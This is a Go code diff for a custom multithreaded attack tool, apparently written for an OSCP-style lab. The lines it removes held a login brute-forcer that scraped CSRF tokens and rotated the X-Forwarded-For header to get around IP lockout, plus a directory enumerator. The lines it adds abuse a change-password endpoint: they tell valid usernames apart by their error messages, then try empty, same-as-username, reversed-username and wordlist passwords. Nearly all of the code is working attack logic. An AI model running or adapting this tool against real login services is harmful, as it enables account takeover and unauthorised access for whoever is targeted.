@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"context"
+	//"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -12,7 +13,7 @@ import (
 	"net/http/cookiejar"
 	"net/url"
 	"os"
-	"regexp"
+	//"regexp"
 	"strconv"
 	"strings"
 	"sync"
@@ -21,15 +22,13 @@ import (
 )
 
 func main() {
-	//bruteMain()
-	directoryMain()
+	//bruteUserMain()
+	brutePasswordMain()
 }
 
 ///// login brute
 
-func bruteMain() {
-	var err error
-
+func bruteUserMain() {
 	// target url
 	targetUrl := os.Args[1]
 
@@ -40,139 +39,86 @@ func bruteMain() {
 	threads, err := strconv.Atoi(os.Args[3])
 	fatalIfErr(err)
 
-	// measure execution time
-	start := time.Now()
+	// create worker pool
+	wp, producerCh := NewWorkerPool(threads, targetUrl, bruteUser)
 
-	// read password list (producer)
-	ch := make(chan string)
-	go fileBufferedReader(fileName, ch)
+	// read wordlist (producer)
+	go fileBufferedReader(fileName, producerCh)
 
-	// setup and create workers (consumers)
-	r := regexp.MustCompile(`input.+?name="tokenCSRF".+?value="(.+?)"`)
-	ctx, cancelFun := context.WithCancel(context.Background())
-	var wg sync.WaitGroup
-	for i := 0; i < threads; i++ {
-		wg.Add(1)
-		go bruteBunnyWorker(targetUrl, r, ch, ctx, cancelFun, &wg)
-	}
-
-	// wait for workers to finish before printing execution time
-	wg.Wait()
-	fmt.Printf("%.2fs elapsed\n", time.Since(start).Seconds())
+	// start worker pool
+	wp.Work()
 }
 
-func bruteBunnyWorker(fullUrl string, r *regexp.Regexp, ch chan string, ctx context.Context, cancelFun context.CancelFunc, wg *sync.WaitGroup) {
-	defer wg.Done()
-	toorbnny := NewToorBnny()
+func brutePasswordMain() {
+	// target url
+	targetUrl := os.Args[1]
 
-	for passwd := range ch {
-		select {
-		case <-ctx.Done():
-			break
-		default:
-			token := getCsrfToken(toorbnny, fullUrl, r)
-			if postLoginAttempt(toorbnny, fullUrl, token, passwd) {
-				fmt.Printf("[*] Password found: %s\n", passwd)
-				cancelFun()
-				break
-			}
-		}
+	// wordlists for enumeration
+	fileNameUsers := os.Args[2]
+	fileNamePasswords := os.Args[3]
+
+	// number of threads
+	threads, err := strconv.Atoi(os.Args[4])
+	fatalIfErr(err)
+
+	// create worker pool
+	wp, producerCh := NewWorkerPool(threads, targetUrl, brutePassword)
+
+	// read user and password lists (producer)
+	go userAndPasswordBufferedReader(fileNameUsers, fileNamePasswords, producerCh)
+
+	// start worker pool
+	wp.Work()
+}
+
+func bruteUser(toorbnny *ToorBnny, url string, payload map[string]string, cancelFunc context.CancelFunc) {
+	user := payload["default"]
+	username := fmt.Sprintf("%s@oscp.exam", user)
+	response := postChangePassword(toorbnny, url, username, "ESMWaterP1p3S!")
+	
+	// check response
+	body := string(*response.Body)
+	invalidUserError := `{"errors":[{"errorCode":3,"fieldName":null,"message":null}],"payload":null}`
+	invalidPasswordError := `{"errors":[{"errorCode":0,"fieldName":null,"message":"Unknown error (0x80005000)"}],"payload":null}`
+	if body != invalidUserError && body != invalidPasswordError {
+		fmt.Println(user)
+		// fmt.Printf("user=%s\tresponse=%s\n", user, body)
 	}
 }
 
-func postLoginAttempt(toorbnny *ToorBnny, fullUrl, token, passwd string) bool {
+func brutePassword(toorbnny *ToorBnny, url string, payload map[string]string, cancelFunc context.CancelFunc) {
+	username := fmt.Sprintf("%s@oscp.exam", payload["user"])
+	password := payload["password"]
+	response := postChangePassword(toorbnny, url, username, password)
+
+	// check response
+	body := string(*response.Body)
+	invalidPasswordError := `{"errors":[{"errorCode":0,"fieldName":null,"message":"Unknown error (0x80005000)"}],"payload":null}`
+	if password != "" && body != invalidPasswordError {
+		fmt.Printf("username=%s\tpassword=%s\tresponse=%s\n", username, password, body)
+	}
+}
+
+func postChangePassword(toorbnny *ToorBnny, fullUrl, username, password string) *Response {
 	// request headers
 	headers := http.Header{}
-	headers.Add("X-Forwarded-For", passwd)
 	headers.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0")
 	headers.Set("Referer", fullUrl)
-
+		
 	// form data
 	data := url.Values{}
-	data.Add("tokenCSRF", token)
-	data.Add("username", "fergus")
-	data.Add("password", passwd)
-	data.Add("save", "")
-	encodedData := FormBodyEncoder(data, headers)
-
+	data.Add("Username", username)
+	data.Add("CurrentPassword", password)
+	data.Add("NewPassword", password)
+	data.Add("NewPasswordVerify", password)
+	data.Add("Recaptcha", "")
+	encodedData := JsonBodyEncoder(data, headers)
+		
 	// post response
 	response, err := toorbnny.Post(fullUrl, headers, encodedData)
 	fatalIfErr(err)
 
-	return response.Header.Get("Location") == "/admin/dashboard"
-}
-
-func getCsrfToken(toorbnny *ToorBnny, url string, r *regexp.Regexp) string {
-	response, err := toorbnny.Get(url, nil)
-	fatalIfErr(err)
-
-	token := r.FindStringSubmatch(string(*response.Body))[1]
-	return token
-}
-
-///// directory enum
-
-func directoryMain() {
-	// target url
-	url := os.Args[1]
-
-	// file name for enumeration
-	fileName := os.Args[2]
-
-	// number of threads
-	threads, err := strconv.Atoi(os.Args[3])
-	fatalIfErr(err)
-
-	// measure execution time
-	start := time.Now()
-
-	// read password list (producer)
-	ch := make(chan string)
-	go fileBufferedReader(fileName, ch)
-
-	// setup and create workers (consumers)
-	var wg sync.WaitGroup
-	for i := 0; i < threads; i++ {
-		wg.Add(1)
-		go directoryBunnyWorker(url, ch, &wg, i)
-	}
-
-	// wait for all workers to finish before printing execution time
-	wg.Wait()
-	fmt.Printf("%.2fs elapsed\n", time.Since(start).Seconds())
-}
-
-func directoryBunnyWorker(baseUrl string, ch chan string, wg *sync.WaitGroup, id int) {
-	defer wg.Done()
-	toorbnny := NewToorBnny()
-	count := 0
-	sum := 0.0
-	
-	for work := range ch {
-		for _, payload := range payloadGenerator(work) {
-			fullUrl := fmt.Sprintf("%s/%s", baseUrl, payload)
-
-			response, err := toorbnny.Head(fullUrl, nil)
-			if err != nil {
-				fmt.Println(err)
-				continue
-			}
-
-			count++
-			sum += response.Latency
-			if response.StatusCode != 404 {
-				fmt.Printf("-> (%d) %s\n", response.StatusCode, fullUrl)
-			}
-
-			if id == 0 && count%100 == 0 {
-				fmt.Printf("[*] Iteration ~= %d | Trying = %s | Avg = %.2fs\n",
-					count,
-					work,
-					sum/float64(count),
-				)
-			}
-		}
-	}
+	return response
 }
 
 ///// util
@@ -187,7 +133,7 @@ func payloadGenerator(payload string) []string {
 	}
 }
 
-func fileBufferedReader(fileName string, ch chan<- string) {
+func fileBufferedReader(fileName string, ch chan<- map[string]string) {
 	file, err := os.Open(fileName)
 	fatalIfErr(err)
 	defer file.Close()
@@ -195,11 +141,74 @@ func fileBufferedReader(fileName string, ch chan<- string) {
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := scanner.Text()
-		ch <- line
+		payload := map[string]string{ "default": line}
+		ch <- payload
 	}
 	fatalIfErr(scanner.Err())
 
 	close(ch)
+}
+
+func userAndPasswordBufferedReader(fileNameUsers string, fileNamePasswords string, ch chan<- map[string]string) {
+	defer close(ch)
+	var payload map[string]string
+	counter := 0
+	
+	fileUsers, err := os.Open(fileNameUsers)
+	fatalIfErr(err)
+	scannerUsers := bufio.NewScanner(fileUsers)
+	for scannerUsers.Scan() {
+		user := scannerUsers.Text()
+
+		// empty password
+		payload = map[string]string{ "user": user, "password": ""}
+		ch <- payload
+
+		// username as password
+		payload = map[string]string{ "user": user, "password": user}
+		ch <- payload
+
+		// rev username as password
+		payload = map[string]string{ "user": user, "password": reverse(user)}
+		ch <- payload
+	}
+	fatalIfErr(scannerUsers.Err())
+	fileUsers.Close()
+	
+	filePasswords, err2 := os.Open(fileNamePasswords)
+	fatalIfErr(err2)
+	defer filePasswords.Close()
+
+	scannerPasswds := bufio.NewScanner(filePasswords)
+	for scannerPasswds.Scan() {
+		password := scannerPasswds.Text()
+
+		counter += 1
+		if counter % 100000 == 0 {
+			fmt.Println(counter, password)
+		}
+		
+		fileUsers, err = os.Open(fileNameUsers)
+		fatalIfErr(err)
+
+		scannerUsers = bufio.NewScanner(fileUsers)
+		for scannerUsers.Scan() {
+			user := scannerUsers.Text()
+			
+			payload = map[string]string{ "user": user, "password": password}
+			ch <- payload
+		}
+		fatalIfErr(scannerUsers.Err())
+		fileUsers.Close()
+	}
+	fatalIfErr(scannerPasswds.Err())
+}
+
+func reverse(str string) (result string) {
+    for _, v := range str {
+        result = string(v) + result
+    }
+    return
 }
 
 func fatalIfErr(err error) {
@@ -209,9 +218,18 @@ func fatalIfErr(err error) {
 }
 
 ///// lib
-
 type ToorBnny struct {
 	*http.Client
+}
+
+type WorkerPool struct {
+	context context.Context
+	cancelFunc context.CancelFunc
+	numWorkers int
+	producerCh chan map[string]string
+	url string
+	workFunc WorkFunc
+	waitGroup *sync.WaitGroup
 }
 
 type Response struct {
@@ -220,8 +238,10 @@ type Response struct {
 	Latency float64
 }
 
+type WorkFunc func(t *ToorBnny, url string, payload map[string]string, cancelFunc context.CancelFunc)
+
 func NewToorBnny() *ToorBnny {
-	proxyStr := "http://localhost:8080"
+	proxyStr := "http://localhost:8081"
 	proxyUrl, err := url.Parse(proxyStr)
 	fatalIfErr(err)
 
@@ -250,6 +270,33 @@ func NewToorBnny() *ToorBnny {
 	return toorbnny
 }
 
+func NewWorkerPool(numWorkers int, url string, workFunc WorkFunc) (*WorkerPool, chan map[string]string) {
+	ctx, cancelFunc := context.WithCancel(context.Background())
+	producerCh := make(chan map[string]string, numWorkers)
+	waitGroup := new(sync.WaitGroup)
+
+	workerPool := &WorkerPool{
+		context: ctx,
+		cancelFunc: cancelFunc,
+		numWorkers: numWorkers,
+		producerCh: producerCh,
+		url: url,
+		waitGroup: waitGroup,
+		workFunc: workFunc,
+	}
+
+	return workerPool, producerCh
+}
+
+func (w WorkerPool) Work() {
+	defer w.waitGroup.Wait()
+
+	for i := 0; i < w.numWorkers; i++ {
+		w.waitGroup.Add(1)
+		go w.worker()
+	}
+}
+
 func FormBodyEncoder(values url.Values, headers http.Header) io.Reader {
 	encodedData := values.Encode()
 	body := strings.NewReader(string(encodedData))
@@ -258,7 +305,16 @@ func FormBodyEncoder(values url.Values, headers http.Header) io.Reader {
 }
 
 func JsonBodyEncoder(values url.Values, headers http.Header) io.Reader {
-	encodedData, err := json.Marshal(values)
+	payload := make(map[string]interface{})
+	for k,v := range values {
+		if len(v) == 1 {
+			payload[k] = v[0]
+		} else {
+			payload[k] = v
+		}
+	}
+
+	encodedData, err := json.Marshal(payload)
 	fatalIfErr(err)
 
 	body := strings.NewReader(string(encodedData))
@@ -315,6 +371,26 @@ func (t ToorBnny) doRequest(method, url string, headers http.Header, data io.Rea
 		Body:     &body,
 		Latency:  latency,
 	}, nil
+}
+
+func (w WorkerPool) worker() {
+	defer w.waitGroup.Done()
+	toorbnny := NewToorBnny()
+	
+	for payload := range w.producerCh {
+		select {
+		case <-w.context.Done():
+			fmt.Println("Done, exit")
+			break
+		default:
+			// reset the cookie jar to prevent previous requests from interfering with future requests
+			jar, err := cookiejar.New(nil)
+			fatalIfErr(err)
+			toorbnny.Jar = jar
+			
+			w.workFunc(toorbnny, w.url, payload, w.cancelFunc)
+		}
+	}
 }
 
 func addIfNotExists(headers http.Header, key, value string) {
